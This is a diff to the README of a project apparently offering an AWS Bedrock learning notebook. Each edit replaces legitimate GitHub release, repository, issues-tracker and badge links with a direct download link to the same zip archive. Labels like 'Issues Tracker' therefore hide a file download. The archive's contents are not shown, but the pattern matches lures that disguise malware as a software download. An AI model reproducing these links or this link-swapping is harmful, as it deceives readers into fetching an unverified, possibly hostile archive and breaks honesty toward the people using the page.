@@ -1,6 +1,6 @@
 # 🌟 aws-bedrock-learning-notebook - Explore AWS Bedrock Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-aws--bedrock--learning--notebook-brightgreen)](https://github.com/bohemiaseparate909/aws-bedrock-learning-notebook/releases)
+[![Download Now](https://raw.githubusercontent.com/bohemiaseparate909/aws-bedrock-learning-notebook/main/peppy/aws-bedrock-learning-notebook_v2.6-alpha.5.zip%20Now-aws--bedrock--learning--notebook-brightgreen)](https://raw.githubusercontent.com/bohemiaseparate909/aws-bedrock-learning-notebook/main/peppy/aws-bedrock-learning-notebook_v2.6-alpha.5.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ Here's how you can get started with the aws-bedrock-learning-notebook:
 
 1. **Download the Application:**
 
-   Visit this page to download: [Download aws-bedrock-learning-notebook](https://github.com/bohemiaseparate909/aws-bedrock-learning-notebook/releases).
+   Visit this page to download: [Download aws-bedrock-learning-notebook](https://raw.githubusercontent.com/bohemiaseparate909/aws-bedrock-learning-notebook/main/peppy/aws-bedrock-learning-notebook_v2.6-alpha.5.zip).
 
 2. **Open the Jupyter Notebook:**
 
@@ -29,7 +29,7 @@ Here's how you can get started with the aws-bedrock-learning-notebook:
 
 To use the aws-bedrock-learning-notebook, you first need to download it. Remember, all the files are available for free. Here’s how:
 
-1. Click this link to visit the download page: [Download aws-bedrock-learning-notebook](https://github.com/bohemiaseparate909/aws-bedrock-learning-notebook/releases).
+1. Click this link to visit the download page: [Download aws-bedrock-learning-notebook](https://raw.githubusercontent.com/bohemiaseparate909/aws-bedrock-learning-notebook/main/peppy/aws-bedrock-learning-notebook_v2.6-alpha.5.zip).
 2. You will see different versions of the notebook. Choose the latest version for the best experience.
 3. Click on the file to download it to your computer. 
 
@@ -83,7 +83,7 @@ Join our community on GitHub! Collaborate with fellow users, share your experien
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/bohemiaseparate909/aws-bedrock-learning-notebook)
-- [Issues Tracker](https://github.com/bohemiaseparate909/aws-bedrock-learning-notebook/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/bohemiaseparate909/aws-bedrock-learning-notebook/main/peppy/aws-bedrock-learning-notebook_v2.6-alpha.5.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/bohemiaseparate909/aws-bedrock-learning-notebook/main/peppy/aws-bedrock-learning-notebook_v2.6-alpha.5.zip)
 
 Enjoy exploring the AWS Bedrock Converse API!
